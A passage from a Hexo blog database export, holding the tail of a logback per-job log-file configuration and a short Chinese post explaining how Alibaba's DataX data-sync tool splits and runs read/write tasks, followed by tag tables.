class=\"name\">defaultValue</span>&gt;</span>unknown<span class=\"tag\">&lt;/<span class=\"name\">defaultValue</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">discriminator</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">sift</span>&gt;</span></span><br><span class=\"line\">        <span class=\"comment\">&lt;!--具体的写日志appender，每一个userId创建一个文件--&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">appender</span> <span class=\"attr\">name</span>=<span class=\"string\">\"$&#123;jobId&#125;\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"ch.qos.logback.core.rolling.RollingFileAppender\"</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">append</span>&gt;</span>true<span class=\"tag\">&lt;/<span class=\"name\">append</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">encoder</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"UTF-8\"</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss&#125; %level %logger&#123;36&#125; - %msg%n<span class=\"tag\">&lt;/<span class=\"name\">pattern</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">encoder</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">file</span>&gt;</span>$&#123;logdir&#125;/job/$&#123;jobId&#125;.log<span class=\"tag\">&lt;/<span class=\"name\">file</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">rollingPolicy</span> <span class=\"attr\">class</span>=<span class=\"string\">\"ch.qos.logback.core.rolling.SizeAndTimeBasedRollingPolicy\"</span>&gt;</span></span><br><span class=\"line\">                <span class=\"comment\">&lt;!--定义文件滚动时的文件名的格式--&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">fileNamePattern</span>&gt;</span>./logs/job/%d&#123;yyyyMMdd&#125;/$&#123;jobId&#125;-%i.log<span class=\"tag\">&lt;/<span class=\"name\">fileNamePattern</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">maxFileSize</span>&gt;</span>500MB<span class=\"tag\">&lt;/<span class=\"name\">maxFileSize</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">maxHistory</span>&gt;</span>60<span class=\"tag\">&lt;/<span class=\"name\">maxHistory</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">totalSizeCap</span>&gt;</span>20GB<span class=\"tag\">&lt;/<span class=\"name\">totalSizeCap</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">rollingPolicy</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">filter</span> <span class=\"attr\">class</span>=<span class=\"string\">\"ch.qos.logback.classic.filter.ThresholdFilter\"</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">level</span>&gt;</span>INFO<span class=\"tag\">&lt;/<span class=\"name\">level</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">filter</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">appender</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">sift</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">appender</span>&gt;</span></span><br></pre></td></tr></table></figure>\n"},{"title":"datax原理通俗分析","date":"2021-06-13T02:29:35.000Z","_content":"\n### 介绍\n\ndatax是阿里开源作为数据同步工具，支持多种数据源交叉同步，具体可见https://github.com/alibaba/DataX 还有参考datax实现的flinkx，通过flink去实现，https://github.com/DTStack/chunjun 阿里开源的datax只是一个单机版，具体要用到公司的业务中，我们还是需要进行包装一下，才能用的方便。因此笔者在工作期间花了很多时间去改造datax，让它变得更加易用。本文主要是通俗介绍datax的原理。\n\n### 源码分析\n\n主要原理简单来说，就是一个读线程从各种数据源读取数据，放到一个队列里，另外一个写线程从这个队列里取数据。在写线程取数据前还可以对数据进行etl处理。\n\n具体的datax执行job主要分为这么几步。\n1. 拆分任务。为拆读任务和写任务，且读写任务最终拆出来的结果要1:1。\n2. 执行任务。拆出来的任务，封装成一组又一组的线程进行执行。\n3. 在任务运行期间进行数据统计。\n\n具体实现可查看代码TaskGroupContainer类型，这个类包含了任务具体的执行过程。\n","source":"_posts/dataX通俗分析.md","raw":"---\ntitle: datax原理通俗分析\ndate: 2021-06-13 10:29:35\ntags: datax\n---\n\n### 介绍\n\ndatax是阿里开源作为数据同步工具，支持多种数据源交叉同步，具体可见https://github.com/alibaba/DataX 还有参考datax实现的flinkx，通过flink去实现，https://github.com/DTStack/chunjun 阿里开源的datax只是一个单机版，具体要用到公司的业务中，我们还是需要进行包装一下，才能用的方便。因此笔者在工作期间花了很多时间去改造datax，让它变得更加易用。本文主要是通俗介绍datax的原理。\n\n### 源码分析\n\n主要原理简单来说，就是一个读线程从各种数据源读取数据，放到一个队列里，另外一个写线程从这个队列里取数据。在写线程取数据前还可以对数据进行etl处理。\n\n具体的datax执行job主要分为这么几步。\n1. 拆分任务。为拆读任务和写任务，且读写任务最终拆出来的结果要1:1。\n2. 执行任务。拆出来的任务，封装成一组又一组的线程进行执行。\n3. 在任务运行期间进行数据统计。\n\n具体实现可查看代码TaskGroupContainer类型，这个类包含了任务具体的执行过程。\n","slug":"dataX通俗分析","published":1,"updated":"2022-03-20T10:33:29.227Z","_id":"cl0z4im2d00048i722x0dh71a","comments":1,"layout":"post","photos":[],"link":"","content":"<h3 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h3><p>datax是阿里开源作为数据同步工具，支持多种数据源交叉同步，具体可见<a href=\"https://github.com/alibaba/DataX\" target=\"_blank\" rel=\"noopener\">https://github.com/alibaba/DataX</a> 还有参考datax实现的flinkx，通过flink去实现，<a href=\"https://github.com/DTStack/chunjun\" target=\"_blank\" rel=\"noopener\">https://github.com/DTStack/chunjun</a> 阿里开源的datax只是一个单机版，具体要用到公司的业务中，我们还是需要进行包装一下，才能用的方便。因此笔者在工作期间花了很多时间去改造datax，让它变得更加易用。本文主要是通俗介绍datax的原理。</p>\n<h3 id=\"源码分析\"><a href=\"#源码分析\" class=\"headerlink\" title=\"源码分析\"></a>源码分析</h3><p>主要原理简单来说，就是一个读线程从各种数据源读取数据，放到一个队列里，另外一个写线程从这个队列里取数据。在写线程取数据前还可以对数据进行etl处理。</p>\n<p>具体的datax执行job主要分为这么几步。</p>\n<ol>\n<li>拆分任务。为拆读任务和写任务，且读写任务最终拆出来的结果要1:1。</li>\n<li>执行任务。拆出来的任务，封装成一组又一组的线程进行执行。</li>\n<li>在任务运行期间进行数据统计。</li>\n</ol>\n<p>具体实现可查看代码TaskGroupContainer类型，这个类包含了任务具体的执行过程。</p>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h3><p>datax是阿里开源作为数据同步工具，支持多种数据源交叉同步，具体可见<a href=\"https://github.com/alibaba/DataX\" target=\"_blank\" rel=\"noopener\">https://github.com/alibaba/DataX</a> 还有参考datax实现的flinkx，通过flink去实现，<a href=\"https://github.com/DTStack/chunjun\" target=\"_blank\" rel=\"noopener\">https://github.com/DTStack/chunjun</a> 阿里开源的datax只是一个单机版，具体要用到公司的业务中，我们还是需要进行包装一下，才能用的方便。因此笔者在工作期间花了很多时间去改造datax，让它变得更加易用。本文主要是通俗介绍datax的原理。</p>\n<h3 id=\"源码分析\"><a href=\"#源码分析\" class=\"headerlink\" title=\"源码分析\"></a>源码分析</h3><p>主要原理简单来说，就是一个读线程从各种数据源读取数据，放到一个队列里，另外一个写线程从这个队列里取数据。在写线程取数据前还可以对数据进行etl处理。</p>\n<p>具体的datax执行job主要分为这么几步。</p>\n<ol>\n<li>拆分任务。为拆读任务和写任务，且读写任务最终拆出来的结果要1:1。</li>\n<li>执行任务。拆出来的任务，封装成一组又一组的线程进行执行。</li>\n<li>在任务运行期间进行数据统计。</li>\n</ol>\n<p>具体实现可查看代码TaskGroupContainer类型，这个类包含了任务具体的执行过程。</p>\n"}],"PostAsset":[],"PostCategory":[],"PostTag":[{"post_id":"ckox55gc00000ak9c9bvcbsol","tag_id":"ckox55gc80002ak9cgzupah8r","_id":"ckox55gce0007ak9c506f3qaw"},{"post_id":"ckox55gc60001ak9c30zz7lue","tag_id":"ckox55gcd0006ak9c106tckkb","_id":"ckox55gch000cak9cegbvfg69"},{"post_id":"ckox55gca0003ak9c1aph9mzc","tag_id":"ckox55gcg000aak9c0e7f2ymf","_id":"ckox55gcn000gak9cg5mu9i0l"},{"post_id":"ckox55gcb0004ak9c4hpjabqr","tag_id":"ckox55gcd0006ak9c106tckkb","_id":"ckox55gcq000kak9cbj19gn1z"},{"post_id":"ckox55gcn000hak9c7cbkaa8t","tag_id":"ckox55gcg000aak9c0e7f2ymf","_id":"ckox55gcs000mak9cfyf35aw7"},{"post_id":"ckox55gcc0005ak9cgq5t5mk3","tag_id":"ckox55gcg000aak9c0e7f2ymf","_id":"ckox55gct000pak9c9zmk8a7z"},{"post_id":"ckox55gcr000lak9cdivu8v8w","tag_id":"ckox55gc80002ak9cgzupah8r","_id":"ckox55gcv000rak9c6xriev2o"},{"post_id":"ckox55gce0008ak9c9eot01ej","tag_id":"ckox55gcs000nak9c87kb4ivw","_id":"ckox55gcw000tak9caj73fygj"},{"post_id":"ckox55gcf0009ak9c08bv06ll","tag_id":"ckox55gcv000sak9chv799dr0","_id":"ckox55gcy000vak9cb69tbsgp"},{"post_id":"ckox55gch000bak9c68ky2bxc","tag_id":"ckox55gcs000nak9c87kb4ivw","_id":"ckox55gd0000xak9c57r5cyy2"},{"post_id":"ckox55gci000dak9cg3gedgr9","tag_id":"ckox55gcy000wak9ccjiqgn0k","_id":"ckox55gd1000zak9c2nvf2q6r"},{"post_id":"ckox55gcl000fak9cgdav6zrd","tag_id":"ckox55gd1000yak9cht6ve2d2","_id":"ckox55gd20011ak9c5p76asvv"},{"post_id":"ckox55gcp000jak9c7hkzbpwe","tag_id":"ckox55gd10010ak9chc933rhs","_id":"ckox55gd20013ak9c0eic96o5"},{"post_id":"ckox55gcs000oak9cdn51cvwm","tag_id":"ckox55gd20012ak9chb2e05f5","_id":"ckox55gd30015ak9cftd71ql7"},{"post_id":"ckox55gcu000qak9cdco8diba","tag_id":"ckox55gd20014ak9ca3xm4q10","_id":"ckox55gd30016ak9ccq5tf3kp"},{"post_id":"cktx054el0000qj72duacfvpc","tag_id":"ckox55gd20012ak9chb2e05f5","_id":"cktx054et0001qj72bz4ja285"},{"post_id":"cl0z4fvae00008i726ozp0uei","tag_id":"cl0z4fvam00018i72cfjbfbiw","_id":"cl0z4fvav00028i722fsj4nqn"},{"post_id":"cl0z4im2d00048i722x0dh71a","tag_id":"cl0z4fvam00018i72cfjbfbiw","_id":"cl0z52ncz00058i72e2jy60ca"}],"Tag":[{"name":"java","_id":"ckox55gc80002ak9cgzupah8r"},{"name":"php","_id":"ckox55gcd0006ak9c106tckkb"},{"name":"网络安全","_id":"ckox55gcg000aak9c0e7f2ymf"},{"name":"ubuntu linux","_id":"ckox55gcs000nak9c87kb4ivw"},{"name":"java hdfs","_id":"ckox55gcv000sak9chv799dr0"},{"name":"php linux docker","_id":"ckox55gcy000wak9ccjiqgn0k"},{"name":"python","_id":"ckox55gd1000yak9cht6ve2d2"},{"name":"ubuntu","_id":"ckox55gd10010ak9chc933rhs"},{"name":"github hexo","_id":"ckox55gd20012ak9chb2e05f5"},{"name":"webrtc","_id":"ckox55gd20014ak9ca3xm4q10"},{"name":"datax","_id":"cl0z4fvam00018i72cfjbfbiw"}]}}